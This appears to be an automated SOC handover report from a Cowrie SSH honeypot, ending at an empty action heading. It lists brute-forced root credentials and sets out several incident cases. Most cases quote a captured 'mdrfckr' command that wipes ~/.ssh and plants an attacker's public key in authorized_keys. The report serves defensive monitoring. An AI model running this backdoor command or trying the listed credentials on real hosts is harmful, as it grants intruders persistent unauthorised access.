# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-02 |
| **Generated At** | 2026-05-02T14:53:32Z |
| **Shift Time** | 14:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **992** |
| Confirmed Threats | **145** |
| False Positives Filtered | **847** (85.4%) |
| Unique Attacker IPs | **35** |
| Countries of Origin | **18** |
| High Severity Cases | **20** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **972** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **100** |
| Unique Credential Pairs | **50** |
| Unique Usernames | **31** |
| Unique Passwords | **50** |
| Successful Auth Pairs | **14** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 20 |
| `345gs5662d34` | 10 |
| `user` | 9 |
| `ubuntu` | 8 |
| `test` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 10 |
| `3245gs5662d34` | 10 |
| `user123$%^` | 3 |
| `admin` | 2 |
| `userpass` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `3245gs5662d34` | 10 |
| `root` | `user123$%^` | 3 |
| `student` | `admin` | 2 |
| `user` | `userpass` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `user123$%^` | `152.52.15.213` | 2026-05-02T13:54:19 |
| `root` | `3245gs5662d34` | `152.52.15.213` | 2026-05-02T13:54:21 |
| `root` | `oracle7` | `152.53.22.186` | 2026-05-02T14:06:12 |
| `root` | `3245gs5662d34` | `152.53.22.186` | 2026-05-02T14:06:15 |
| `root` | `user123$%^` | `152.53.22.186` | 2026-05-02T14:11:56 |
| `root` | `admin3344` | `152.53.22.186` | 2026-05-02T14:16:59 |
| `root` | `user123$%^` | `203.228.30.198` | 2026-05-02T14:18:30 |
| `root` | `3245gs5662d34` | `203.228.30.198` | 2026-05-02T14:18:34 |
| `root` | `admin3344` | `203.228.30.198` | 2026-05-02T14:21:13 |
| `root` | `oracle7` | `203.228.30.198` | 2026-05-02T14:27:41 |
| `root` | `admin@123$%^` | `152.53.22.186` | 2026-05-02T14:28:25 |
| `root` | `admin@123$%^` | `203.228.30.198` | 2026-05-02T14:31:25 |
| `root` | `admin321` | `161.35.205.74` | 2026-05-02T14:40:13 |
| `root` | `3245gs5662d34` | `161.35.205.74` | 2026-05-02T14:40:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **992** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 135 |
| Perl Net::SSH | 2 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 119 | 7 |
| `03a80b21afa8...` | Modern SSH client | 7 | 2 |
| `3c0eaacec19b...` | Mirai/variant | 2 | 2 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 119 | 7 | libssh-based |
| `95420f9d932d...` | libssh | 9 | 3 | — |
| `03a80b21afa8...` | libssh | 7 | 2 | Modern SSH client |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `161.35.205.74`, `203.228.30.198`, `152.52.15.213`, `152.53.22.186`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **35** |
| Unique ASNs | **27** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 6 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS51167` | Contabo GmbH | 2 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS36903` | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | 1 | HIGH |
| `AS29256` | STE PDN Internal AS | 1 | LOW |
| `AS131267` | Star Telecom | 1 | LOW |
| `AS28258` | VERO S.A | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (20)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-54d26c63674c

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]213` |
| **First Seen** | 2026-05-02 13:54 |
| **Last Seen** | 2026-05-02 13:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:54:19` | `cowrie.session.connect` |
| `2026-05-02 13:54:19` | `cowrie.client.version` |
| `2026-05-02 13:54:19` | `cowrie.client.kex` |
| `2026-05-02 13:54:19` | `cowrie.login.success` |
| `2026-05-02 13:54:19` | `cowrie.session.params` |
| `2026-05-02 13:54:19` | `cowrie.command.input` |
| `2026-05-02 13:54:19` | `cowrie.command.failed` |
| `2026-05-02 13:54:19` | `cowrie.log.closed` |
| `2026-05-02 13:54:20` | `cowrie.session.params` |
| `2026-05-02 13:54:20` | `cowrie.command.input` |
| `2026-05-02 13:54:20` | `cowrie.session.file_download` |
| `2026-05-02 13:54:20` | `cowrie.log.closed` |
| `2026-05-02 13:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]213` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2479f2c69148

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]213` |
| **First Seen** | 2026-05-02 13:54 |
| **Last Seen** | 2026-05-02 13:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:54:21` | `cowrie.session.connect` |
| `2026-05-02 13:54:21` | `cowrie.client.version` |
| `2026-05-02 13:54:21` | `cowrie.client.kex` |
| `2026-05-02 13:54:21` | `cowrie.login.success` |
| `2026-05-02 13:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]213` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dc5b8801bcb

| Field | Detail |
|---|---|
| **Source IP** | `152.53.22[.]186` |
| **First Seen** | 2026-05-02 14:06 |
| **Last Seen** | 2026-05-02 14:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:06:11` | `cowrie.session.connect` |
| `2026-05-02 14:06:11` | `cowrie.client.version` |
| `2026-05-02 14:06:11` | `cowrie.client.kex` |
| `2026-05-02 14:06:12` | `cowrie.login.success` |
| `2026-05-02 14:06:12` | `cowrie.session.params` |
| `2026-05-02 14:06:12` | `cowrie.command.input` |
| `2026-05-02 14:06:12` | `cowrie.command.failed` |
| `2026-05-02 14:06:12` | `cowrie.log.closed` |
| `2026-05-02 14:06:12` | `cowrie.session.params` |
| `2026-05-02 14:06:12` | `cowrie.command.input` |
| `2026-05-02 14:06:12` | `cowrie.session.file_download` |
| `2026-05-02 14:06:12` | `cowrie.log.closed` |
| `2026-05-02 14:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.53.22[.]186` to AbuseIPDB if not already reported
- [ ] Block `152.53.22[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e14122bed650

| Field | Detail |
|---|---|
| **Source IP** | `152.53.22[.]186` |
| **First Seen** | 2026-05-02 14:06 |
| **Last Seen** | 2026-05-02 14:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:06:14` | `cowrie.session.connect` |
| `2026-05-02 14:06:14` | `cowrie.client.version` |
| `2026-05-02 14:06:15` | `cowrie.client.kex` |
| `2026-05-02 14:06:15` | `cowrie.login.success` |
| `2026-05-02 14:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.53.22[.]186` to AbuseIPDB if not already reported
- [ ] Block `152.53.22[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc0ada486a12

| Field | Detail |
|---|---|
| **Source IP** | `152.53.22[.]186` |
| **First Seen** | 2026-05-02 14:11 |
| **Last Seen** | 2026-05-02 14:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:11:56` | `cowrie.session.connect` |
| `2026-05-02 14:11:56` | `cowrie.client.version` |
| `2026-05-02 14:11:56` | `cowrie.client.kex` |
| `2026-05-02 14:11:56` | `cowrie.login.success` |
| `2026-05-02 14:11:57` | `cowrie.session.params` |
| `2026-05-02 14:11:57` | `cowrie.command.input` |
| `2026-05-02 14:11:57` | `cowrie.command.failed` |
| `2026-05-02 14:11:57` | `cowrie.log.closed` |
| `2026-05-02 14:11:57` | `cowrie.session.params` |
| `2026-05-02 14:11:57` | `cowrie.command.input` |
| `2026-05-02 14:11:57` | `cowrie.session.file_download` |
| `2026-05-02 14:11:57` | `cowrie.log.closed` |
| `2026-05-02 14:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.53.22[.]186` to AbuseIPDB if not already reported
- [ ] Block `152.53.22[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab5dc6c297dd

| Field | Detail |
|---|---|
| **Source IP** | `152.53.22[.]186` |
| **First Seen** | 2026-05-02 14:11 |
| **Last Seen** | 2026-05-02 14:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:11:59` | `cowrie.session.connect` |
| `2026-05-02 14:11:59` | `cowrie.client.version` |
| `2026-05-02 14:11:59` | `cowrie.client.kex` |
| `2026-05-02 14:12:00` | `cowrie.login.success` |
| `2026-05-02 14:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.53.22[.]186` to AbuseIPDB if not already reported
- [ ] Block `152.53.22[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b45dec4d6c11

| Field | Detail |
|---|---|
| **Source IP** | `152.53.22[.]186` |
| **First Seen** | 2026-05-02 14:16 |
| **Last Seen** | 2026-05-02 14:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:16:58` | `cowrie.session.connect` |
| `2026-05-02 14:16:58` | `cowrie.client.version` |
| `2026-05-02 14:16:58` | `cowrie.client.kex` |
| `2026-05-02 14:16:59` | `cowrie.login.success` |
| `2026-05-02 14:16:59` | `cowrie.session.params` |
| `2026-05-02 14:16:59` | `cowrie.command.input` |
| `2026-05-02 14:16:59` | `cowrie.command.failed` |
| `2026-05-02 14:16:59` | `cowrie.log.closed` |
| `2026-05-02 14:16:59` | `cowrie.session.params` |
| `2026-05-02 14:16:59` | `cowrie.command.input` |
| `2026-05-02 14:17:00` | `cowrie.session.file_download` |
| `2026-05-02 14:17:00` | `cowrie.log.closed` |
| `2026-05-02 14:17:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.53.22[.]186` to AbuseIPDB if not already reported
- [ ] Block `152.53.22[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c9f46e5ac36

| Field | Detail |
|---|---|
| **Source IP** | `152.53.22[.]186` |
| **First Seen** | 2026-05-02 14:17 |
| **Last Seen** | 2026-05-02 14:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:17:02` | `cowrie.session.connect` |
| `2026-05-02 14:17:02` | `cowrie.client.version` |
| `2026-05-02 14:17:02` | `cowrie.client.kex` |
| `2026-05-02 14:17:02` | `cowrie.login.success` |
| `2026-05-02 14:17:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.53.22[.]186` to AbuseIPDB if not already reported
- [ ] Block `152.53.22[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cfd003423c2

| Field | Detail |
|---|---|
| **Source IP** | `203.228.30[.]198` |
| **First Seen** | 2026-05-02 14:18 |
| **Last Seen** | 2026-05-02 14:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:18:30` | `cowrie.session.connect` |
| `2026-05-02 14:18:30` | `cowrie.client.version` |
| `2026-05-02 14:18:30` | `cowrie.client.kex` |
| `2026-05-02 14:18:30` | `cowrie.login.success` |
| `2026-05-02 14:18:31` | `cowrie.session.params` |
| `2026-05-02 14:18:31` | `cowrie.command.input` |
| `2026-05-02 14:18:31` | `cowrie.command.failed` |
| `2026-05-02 14:18:31` | `cowrie.log.closed` |
| `2026-05-02 14:18:31` | `cowrie.session.params` |
| `2026-05-02 14:18:31` | `cowrie.command.input` |
| `2026-05-02 14:18:31` | `cowrie.session.file_download` |
| `2026-05-02 14:18:31` | `cowrie.log.closed` |
| `2026-05-02 14:18:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.228.30[.]198` to AbuseIPDB if not already reported
- [ ] Block `203.228.30[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a17df10f22ec

| Field | Detail |
|---|---|
| **Source IP** | `203.228.30[.]198` |
| **First Seen** | 2026-05-02 14:18 |
| **Last Seen** | 2026-05-02 14:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:18:33` | `cowrie.session.connect` |
| `2026-05-02 14:18:33` | `cowrie.client.version` |
| `2026-05-02 14:18:33` | `cowrie.client.kex` |
| `2026-05-02 14:18:34` | `cowrie.login.success` |
| `2026-05-02 14:18:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.228.30[.]198` to AbuseIPDB if not already reported
- [ ] Block `203.228.30[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41ba8625f425

| Field | Detail |
|---|---|
| **Source IP** | `203.228.30[.]198` |
| **First Seen** | 2026-05-02 14:21 |
| **Last Seen** | 2026-05-02 14:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:21:12` | `cowrie.session.connect` |
| `2026-05-02 14:21:12` | `cowrie.client.version` |
| `2026-05-02 14:21:12` | `cowrie.client.kex` |
| `2026-05-02 14:21:13` | `cowrie.login.success` |
| `2026-05-02 14:21:13` | `cowrie.session.params` |
| `2026-05-02 14:21:13` | `cowrie.command.input` |
| `2026-05-02 14:21:13` | `cowrie.command.failed` |
| `2026-05-02 14:21:13` | `cowrie.log.closed` |
| `2026-05-02 14:21:13` | `cowrie.session.params` |
| `2026-05-02 14:21:13` | `cowrie.command.input` |
| `2026-05-02 14:21:14` | `cowrie.session.file_download` |
| `2026-05-02 14:21:14` | `cowrie.log.closed` |
| `2026-05-02 14:21:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.228.30[.]198` to AbuseIPDB if not already reported
- [ ] Block `203.228.30[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-840d4d383d5c

| Field | Detail |
|---|---|
| **Source IP** | `203.228.30[.]198` |
| **First Seen** | 2026-05-02 14:21 |
| **Last Seen** | 2026-05-02 14:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:21:16` | `cowrie.session.connect` |
| `2026-05-02 14:21:16` | `cowrie.client.version` |
| `2026-05-02 14:21:16` | `cowrie.client.kex` |
| `2026-05-02 14:21:16` | `cowrie.login.success` |
| `2026-05-02 14:21:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.228.30[.]198` to AbuseIPDB if not already reported
- [ ] Block `203.228.30[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa179e4057d2

| Field | Detail |
|---|---|
| **Source IP** | `203.228.30[.]198` |
| **First Seen** | 2026-05-02 14:27 |
| **Last Seen** | 2026-05-02 14:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:27:40` | `cowrie.session.connect` |
| `2026-05-02 14:27:40` | `cowrie.client.version` |
| `2026-05-02 14:27:40` | `cowrie.client.kex` |
| `2026-05-02 14:27:41` | `cowrie.login.success` |
| `2026-05-02 14:27:41` | `cowrie.session.params` |
| `2026-05-02 14:27:41` | `cowrie.command.input` |
| `2026-05-02 14:27:41` | `cowrie.command.failed` |
| `2026-05-02 14:27:41` | `cowrie.log.closed` |
| `2026-05-02 14:27:42` | `cowrie.session.params` |
| `2026-05-02 14:27:42` | `cowrie.command.input` |
| `2026-05-02 14:27:42` | `cowrie.session.file_download` |
| `2026-05-02 14:27:42` | `cowrie.log.closed` |
| `2026-05-02 14:27:45` | `cowrie.session.closed` |

**Recommended Actions:**
